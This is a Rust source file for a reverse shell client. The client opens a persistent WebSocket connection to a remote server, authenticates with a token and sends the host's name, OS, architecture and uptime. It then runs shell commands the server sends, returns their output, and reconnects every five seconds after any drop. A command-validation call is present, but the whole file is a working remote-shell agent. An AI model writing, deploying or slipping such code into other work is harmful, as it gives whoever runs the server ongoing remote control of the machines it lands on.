use crate::shell::ShellExecutor;
use crate::types::*;
use anyhow::{anyhow, Result};
use futures_util::{SinkExt, StreamExt};
use hostname::get;
use std::time::Duration;
use sysinfo::System;
use tokio::time::sleep;
use tokio_tungstenite::{connect_async, tungstenite::Message as WsMessage};
use tracing::{debug, error, info, warn};
use url::Url;

pub struct ReverseShellClient {
    server_url: String,
    auth_token: String,
    reconnect_interval: Duration,
    use_ssl: bool,
}

impl ReverseShellClient {
    pub fn new(server_url: String, auth_token: String, use_ssl: bool) -> Self {
        Self {
            server_url,
            auth_token,
            reconnect_interval: Duration::from_secs(5),
            use_ssl,
        }
    }

    pub async fn start(&self) -> Result<()> {
        info!("Starting reverse shell client");
        info!("Server URL: {}", self.server_url);
        info!("SSL enabled: {}", self.use_ssl);

        loop {
            match self.connect_and_run().await {
                Ok(_) => {
                    info!("Connection ended normally");
                }
                Err(e) => {
                    error!("Connection error: {}", e);
                }
            }

            info!("Reconnecting in {:?}...", self.reconnect_interval);
            sleep(self.reconnect_interval).await;
        }
    }

    async fn connect_and_run(&self) -> Result<()> {
        let url = if self.use_ssl {
            format!("wss://{}", self.server_url)
        } else {
            format!("ws://{}", self.server_url)
        };

        info!("Connecting to: {}", url);
        let url = Url::parse(&url)?;
        let (ws_stream, _) = connect_async(url).await?;
        let (mut ws_sender, mut ws_receiver) = ws_stream.split();

        info!("Connected to server, authenticating...");

        // Send authentication
        let auth_request = Message::Auth(AuthRequest {
            token: self.auth_token.clone(),
        });
        let auth_json = serde_json::to_string(&auth_request)?;
        ws_sender.send(WsMessage::Text(auth_json)).await?;

        // Wait for authentication response
        let mut authenticated = false;
        let client_id: Option<Uuid>;

        while let Some(msg) = ws_receiver.next().await {
            match msg {
                Ok(WsMessage::Text(text)) => match serde_json::from_str::<Message>(&text) {
                    Ok(Message::AuthResponse(response)) => {
                        if response.success {
                            authenticated = true;
                            client_id = response.client_id;
                            info!("Authentication successful, client ID: {:?}", client_id);
                            break;
                        } else {
                            return Err(anyhow!("Authentication failed: {}", response.message));
                        }
                    }
                    Ok(Message::Error { message }) => {
                        return Err(anyhow!("Server error: {}", message));
                    }
                    _ => {
                        warn!("Unexpected message during authentication");
                    }
                },
                Ok(WsMessage::Close(_)) => {
                    return Err(anyhow!("Connection closed during authentication"));
                }
                Err(e) => {
                    return Err(anyhow!("WebSocket error during authentication: {}", e));
                }
                _ => {}
            }
        }

        if !authenticated {
            return Err(anyhow!("Authentication failed"));
        }

        // Send client registration
        let registration = self.get_client_registration().await?;
        let reg_message = Message::ClientRegistration(registration);
        let reg_json = serde_json::to_string(&reg_message)?;
        ws_sender.send(WsMessage::Text(reg_json)).await?;

        info!("Client registered successfully");

        // Start ping task using a channel
        let (ping_tx, mut ping_rx) = tokio::sync::mpsc::unbounded_channel::<()>();
        let ping_task = tokio::spawn(async move {
            let mut interval = tokio::time::interval(Duration::from_secs(30));
            loop {
                interval.tick().await;
                if ping_tx.send(()).is_err() {
                    break;
                }
            }
        });

        // Handle incoming messages and ping events
        loop {
            tokio::select! {
                // Handle ping events
                _ = ping_rx.recv() => {
                    let ping_message = Message::Ping;
                    if let Ok(ping_json) = serde_json::to_string(&ping_message) {
                        if ws_sender.send(WsMessage::Text(ping_json)).await.is_err() {
                            break;
                        }
                    }
                }

                // Handle incoming messages
                msg = ws_receiver.next() => {
                    match msg {
                        Some(msg) => match msg {
                            Ok(WsMessage::Text(text)) => {
                                match serde_json::from_str::<Message>(&text) {
                                    Ok(Message::ShellCommand(cmd)) => {
                                        debug!("Received shell command: {}", cmd.command);

                                        let response = match ShellExecutor::validate_command(&cmd.command) {
                                            Ok(_) => {
                                                match ShellExecutor::execute_command(&cmd.command).await {
                                                    Ok((output, exit_code)) => {
                                                        ShellResponse {
                                                            output,
                                                            exit_code,
                                                            session_id: cmd.session_id,
                                                        }
                                                    }
                                                    Err(e) => {
                                                        ShellResponse {
                                                            output: format!("Error executing command: {}", e),
                                                            exit_code: -1,
                                                            session_id: cmd.session_id,
                                                        }
                                                    }
                                                }
                                            }
                                            Err(e) => {
                                                ShellResponse {
                                                    output: format!("Command blocked: {}", e),
                                                    exit_code: -1,
                                                    session_id: cmd.session_id,
                                                }
                                            }
                                        };

                                        let response_message = Message::ShellResponse(response);
                                        let response_json = serde_json::to_string(&response_message)?;
                                        ws_sender.send(WsMessage::Text(response_json)).await?;
                                    }
                                    Ok(Message::Ping) => {
                                        let pong_message = Message::Pong;
                                        let pong_json = serde_json::to_string(&pong_message)?;
                                        ws_sender.send(WsMessage::Text(pong_json)).await?;
                                    }
                                    Ok(Message::Pong) => {
                                        debug!("Received pong from server");
                                    }
                                    _ => {
                                        debug!("Received unexpected message");
                                    }
                                }
                            }
                            Ok(WsMessage::Close(_)) => {
                                info!("Server closed connection");
                                break;
                            }
                            Err(e) => {
                                error!("WebSocket error: {}", e);
                                break;
                            }
                            _ => {}
                        }
                        None => {
                            info!("Connection ended");
                            break;
                        }
                    }
                }
            }
        }

        ping_task.abort();
        Ok(())
    }

    async fn get_client_registration(&self) -> Result<ClientRegistration> {
        let hostname = get()
            .map_err(|e| anyhow!("Failed to get hostname: {}", e))?
            .to_string_lossy()
            .to_string();

        let mut system = System::new_all();
        system.refresh_all();

        let os = format!(
            "{} {}",
            System::name().unwrap_or_else(|| "Unknown".to_string()),
            System::os_version().unwrap_or_else(|| "Unknown".to_string())
        );

        let arch = std::env::consts::ARCH.to_string();
        let uptime = System::uptime();

        Ok(ClientRegistration {
            hostname,
            os,
            arch,
            uptime,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_client_creation() {
        let client = ReverseShellClient::new(
            "localhost:8080".to_string(),
            "test_token".to_string(),
            false,
        );
        assert_eq!(client.server_url, "localhost:8080");
        assert_eq!(client.auth_token, "test_token");
        assert!(!client.use_ssl);
    }

    #[tokio::test]
    async fn test_get_client_registration() {
        let client = ReverseShellClient::new(
            "localhost:8080".to_string(),
            "test_token".to_string(),
            false,
        );

        let registration = client.get_client_registration().await.unwrap();
        assert!(!registration.hostname.is_empty());
        assert!(!registration.os.is_empty());
        assert!(!registration.arch.is_empty());
        // uptime is u64, so it's always >= 0
        assert!(registration.uptime < u64::MAX);
    }
}
